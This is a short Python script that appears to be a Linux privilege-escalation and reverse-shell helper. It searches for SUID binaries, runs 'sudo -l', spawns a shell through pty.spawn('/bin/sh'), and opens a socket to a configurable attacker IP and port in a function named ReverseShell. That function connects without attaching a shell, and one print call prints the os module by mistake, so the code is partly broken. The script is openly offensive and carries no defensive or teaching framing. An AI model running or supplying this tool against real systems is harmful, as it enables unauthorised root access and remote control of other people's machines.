import os,socket,sys

IP = "" #Change This
PORT = 1234 #Change This



W  = '\033[0m'  
R  = '\033[31m' 
G  = '\033[32m' 
O  = '\033[33m' 
B  = '\033[34m' 
P  = '\033[35m' 
C  = '\033[36m' 
GR = '\033[40m'
GY = '\033[43m'
GE = '\033[41m'
GW = '\033[4m'
HH = '\033[1m'


def authorization():
    print("*"*50)
    print(R+"Find binaries that have suid bit set (root)"+W)
    print("*"*50)

    aut = os.system("find / -perm -u=s -type f 2>/dev/null")
    print(aut)

    print("*"*50+"\n")

def SuperUserDo():
    print("*"*50)
    print(R+"Files that can be run with sudo"+W)
    print("*"*50)

    do = os.system("sudo -l")
    print(os)

    print("*"*50)

def doSudo():
    sudo = os.system("python -c 'import pty; pty.spawn(\"/bin/sh\")'")
    print(sudo)

def ReverseShell():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((IP,PORT))

try:
    if os.name == "posix":
        print("linux")
        authorization()
        SuperUserDo()
        doSudo()
        ReverseShell()
    if os.name == "nt":
        print("Pleas Use Linux")
        sys.exit()
except:
    sys.exit()
